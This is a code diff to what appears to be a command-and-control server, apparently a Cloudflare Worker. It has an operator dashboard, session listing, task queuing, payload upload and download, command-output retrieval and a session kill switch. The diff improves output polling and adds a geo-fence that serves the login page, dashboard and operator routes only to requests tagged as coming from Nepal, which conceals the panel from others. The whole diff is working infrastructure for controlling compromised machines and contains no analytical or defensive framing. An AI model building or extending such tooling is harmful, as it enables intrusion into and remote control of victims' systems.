@@ -852,6 +852,7 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
       <span class="sel-sid" id="sel-sid"></span>
       <span class="sel-meta" id="sel-meta"></span>
       <div class="sel-actions">
+        <span id="last-poll" style="font-size:9px;letter-spacing:.08em;color:var(--muted);margin-right:8px"></span>
         <button class="act-btn" onclick="fetchResults()">REFRESH</button>
         <button class="act-btn kill" onclick="killSession()">KILL</button>
       </div>
@@ -992,6 +993,7 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
   window.switchTab = switchTab;
 
   // ── Results ──
+  let lastResultCount = 0;
   async function fetchResults() {
     if (!selectedSid) return;
     const r = await api('/results/'+encodeURIComponent(selectedSid));
@@ -1000,17 +1002,43 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
     const box = document.getElementById('output-pane');
     const tc = document.getElementById('tc-output');
     const entries = data.results||[];
-    tc.textContent = entries.length;
+    if (tc) tc.textContent = String(entries.length);
+
+    // Update last-poll indicator
+    const pollEl = document.getElementById('last-poll');
+    if (pollEl) {
+      const now = new Date();
+      pollEl.textContent = 'SYNC ' + now.toUTCString().slice(17,25) + ' UTC';
+      pollEl.style.color = 'var(--hi)';
+      setTimeout(()=>{ if(pollEl) pollEl.style.color = 'var(--muted)'; }, 1200);
+    }
+
     if (!entries.length) {
-      box.innerHTML = '<div style="color:var(--muted);font-size:10px;letter-spacing:.1em;padding:16px;text-transform:uppercase">No output received</div>';
+      if (box.dataset.sid !== selectedSid) {
+        box.innerHTML = '<div style="color:var(--muted);font-size:10px;letter-spacing:.1em;padding:16px;text-transform:uppercase">Awaiting output...</div>';
+        box.dataset.sid = selectedSid;
+      }
+      lastResultCount = 0;
       return;
     }
-    box.innerHTML = entries.slice().reverse().map((e,i)=>
+
+    const hasNew = entries.length !== lastResultCount;
+    if (!hasNew && box.dataset.sid === selectedSid) return; // no change, skip redraw
+
+    const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 40;
+    const sorted = entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);
+    box.innerHTML = sorted.map((e)=>
       \`<div class="result-entry">
         <div class="result-ts"><span class="ts-label">OUTPUT</span>\${esc(e.ts)}</div>
         <div class="result-body">\${esc(e.output)}</div>
       </div>\`
     ).join('');
+    box.dataset.sid = selectedSid;
+
+    if (atBottom || entries.length > lastResultCount) {
+      box.scrollTop = box.scrollHeight;
+    }
+    lastResultCount = entries.length;
   }
   window.fetchResults = fetchResults;
 
@@ -1114,9 +1142,21 @@ header::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;ba
 </script>
 </body>
 </html>`;
+// ─── Geo Guard (dashboard routes only) ───────────────────
+
+function isNepal(request: Request): boolean {
+  const country = request.headers.get("CF-IPCountry") ?? "";
+  return country === "NP";
+}
+
+function geoBlock(): Response {
+  return new Response("403 Forbidden", { status: 403, headers: { "Content-Type": "text/plain" } });
+}
+
 // ─── Auth Handler ─────────────────────────────────────────
 
 async function handleAuth(request: Request, env: Env): Promise<Response> {
+  if (!isNepal(request)) return geoBlock();
   const body = await safeJson<{u?: string; p?: string}>(request);
   if (!body?.u || !body?.p) return errorResponse("Missing credentials", 400);
   const validUser = env.DASHBOARD_USER || "";
@@ -1125,7 +1165,6 @@ async function handleAuth(request: Request, env: Env): Promise<Response> {
   if (!secureCompare(body.u, validUser) || !secureCompare(body.p, validPass)) {
     return errorResponse("Invalid credentials", 401);
   }
-  // Token = operator token — client stores it and uses as X-Operator-Token
   return jsonResponse({ token: env.OPERATOR_TOKEN });
 }
 
@@ -1141,14 +1180,16 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(new Response(null, { status: 204 }), env);
   }
 
-  // ── Web UI ────────────────────────────────────────────────
+  // ── Web UI (Nepal only) ───────────────────────────────────
   if (path === "/" && method === "GET") {
+    if (!isNepal(request)) return geoBlock();
     return new Response(LOGIN_HTML, {
       status: 200,
       headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
     });
   }
   if (path === "/dashboard" && method === "GET") {
+    if (!isNepal(request)) return geoBlock();
     return new Response(DASHBOARD_HTML, {
       status: 200,
       headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
@@ -1183,23 +1224,27 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleDownloadPayload(env), env);
   }
 
-  // ── Operator routes (X-Operator-Token) ──────────────────
+  // ── Operator routes (X-Operator-Token, Nepal only) ────────
   if (path === "/sessions" && method === "GET") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleListSessions(request, env), env);
   }
   if (path === "/task" && method === "POST") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleAddTask(request, env), env);
   }
   if (path === "/audit" && method === "GET") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleAudit(request, env), env);
   }
   if (path === "/payload" && method === "POST") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleUploadPayload(request, env), env);
@@ -1208,6 +1253,7 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   // ── Parameterised operator routes ──────────────────────
   const resultsMatch = path.match(/^\/results\/(.+)$/);
   if (resultsMatch && method === "GET") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     const sid = decodeURIComponent(resultsMatch[1]);
@@ -1216,6 +1262,7 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
 
   const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
   if (sessionsMatch && method === "DELETE") {
+    if (!isNepal(request)) return geoBlock();
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     const sid = decodeURIComponent(sessionsMatch[1]);
